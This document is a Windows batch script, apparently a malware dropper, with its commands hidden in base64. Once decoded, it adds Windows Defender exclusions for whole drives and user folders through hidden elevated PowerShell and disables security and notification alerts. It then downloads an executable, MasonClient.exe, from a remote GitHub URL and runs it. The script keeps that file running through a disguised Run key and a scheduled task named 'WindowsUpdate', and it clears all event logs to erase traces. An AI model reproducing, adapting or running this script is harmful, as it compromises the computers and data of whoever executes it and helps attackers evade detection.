@echo off & setlocal enabledelayedexpansion

set "a=SQBmACAAbgBvAHQAIAAiAG0AbwBkAGUAIgAgAD0APQAgACIAdgBpAHMAaQBiAGwAZQAiACAAdABoAGUAbgA="
set "b=UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACIAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAtAE4AbwBQAHIAbwBmAGkAbABlACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIAAiAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIAAnAGMAOgBcACcAIAAtAEYAbwByAGMAZQAiACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAiACAALQBWAGUAcgBiACAAcgB1AG4AQQBzAA=="
set "c=UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACIAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAtAE4AbwBQAHIAbwBmAGkAbABlACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIAAiAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIAAnACUAdABtAHAAJwAgAC0ARgBvAHIAYwBlACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuACIAIAAtAFYAZQByAGIAIAByAHUAbgBBAHMA"
set "d=UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACIAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAtAE4AbwBQAHIAbwBmAGkAbABlACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIAAiAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIAAnACUAYQBwAHAAZABhAHQAaQAnACAALQBGAG8AcgBjAGUAIgAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIgAgAC0AVgBlAHIAYgAgAHIAdQBuAEEAcwA="
set "e=UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACIAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAtAE4AbwBQAHIAbwBmAGkAbABlACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIAAiAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIAAnAGMAOgBcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFcAaQBuAGQAYQB0AGEAJwAgAC0ARgBvAHIAYwBlACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuACIAIAAtAFYAZQByAGIAIAByAHUAbgBBAHMA"

for /f "delims=" %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%a%'))"') do set "cmd1=%%i"
for /f "delims=" %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%b%'))"') do set "cmd2=%%i"
for /f "delims=" %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%c%'))"') do set "cmd3=%%i"
for /f "delims=" %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%d%'))"') do set "cmd4=%%i"
for /f "delims=" %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%e%'))"') do set "cmd5=%%i"

%cmd1%
%cmd2%
%cmd3%
%cmd4%
%cmd5%

set "r1=cmVnIGFkZCAiSEtFWV9DVXJSRU5UX1VTRVJcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUHVzaE5vdGlmaWNhdGlvbnMiIC9WICJUb2FzdEVuYWJsZWQiIC90IFJFR19EV09SRCAvZCAwIC9m"
set "r2=cmVnIGFkZCAiSEtFWV9DVXJSRU5UX1VTRVJcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUHVzaE5vdGlmaWNhdGlvbnMiIC9WICJMb2NrU2NyZWVuTm90aWZpY2F0aW9uIiAvdCBSRUdfRFdPUkQgL2QgMCAvZg=="
set "r3=cmVnIGFkZCAiSEtFWV9DVXJSRU5UX1VTRVJcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cTm90aWZpY2F0aW9uc1xTZXR0aW5nc1xNU0VkZ2UiIC9WICJFbmFibGVkIiAvdCBSRUdfRFdPUkQgL2QgMCAvZg=="
set "r4=cmVnIGFkZCAiSEtFWV9DVXJSRU5UX1VTRVJcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cTm90aWZpY2F0aW9uc1xTZXR0aW5nc1xXaW5kb3dzLkRlZmVuZGVyLlNlY3VyaXR5Q2VudGVyIiAvViAiRW5hYmxlZCIgL3QgUkVHX0RXT1JEIC9kIDAgL2Y="
set "r5=cmVnIGFkZCAiSEtFWV9DVXJSRU5UX1VTRVJcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcRXhwbG9yZXIiIC9WICJEaXNhYmxlTm90aWZpY2F0aW9uQ2VudGVyIiAvdCBSRUdfRFdPUkQgL2QgMSAvZg=="

for %%v in (r1 r2 r3 r4 r5) do (
    for /f "delims=" %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('!%%v!'))"') do (
        reg %%i
    )
)

set "m1=QzpccHJvZ3JhbWRhdGFcR0ctV2lu"
set "m2=aHR0cHM6Ly9naXRodWIuY29tL2tpbmdsZWFycjItY21kL21heC9yYXcvcmVmcy9oZWFkcy9tYWluL01hc29uQ2xpZW50LmV4ZQ=="

for /f "delims=" %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%m1%'))"') do set "path1=%%i"
for /f "delims=" %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%m2%'))"') do set "url1=%%i"

if not exist "!path1!" mkdir "!path1!"

powershell -command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('!url1!','!path1!\MasonClient.exe')"

set "r6=UkVHIEFERCAiSEtMTSBcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiAvViAiV2luZG93c1Bvd2VydXAiIC90IFJFR19TWiAvRiAvRCAiJXByb2dyYW1kYXRhJVxHRy1XaW5cTWFzb25DbGllbnQuZXhlIg=="
set "s1=c2NodGFza3MgL2NyZWF0ZSAvdG4gV2luZG93c1VwZGF0ZSAvcnUgIiV1c2VybmFtZSUiIC9zYyBPTlNUQVJUIC9kZWxheSAwMDAwOjMwICAvcmwgSElHSEVTVCAvdHIgIiVwcm9ncmFtZGF0YSVcR0ctV2luXE1hc29uQ2xpZW50LmV4ZSIgL2Y="

for /f "delims=" %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%r6%'))"') do %%i
for /f "delims=" %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%s1%'))"') do %%i

start "" "!path1!\MasonClient.exe"

for /f "tokens=*" %%i in ('wevtutil.exe el') do wevtutil.exe cl "%%i"

exit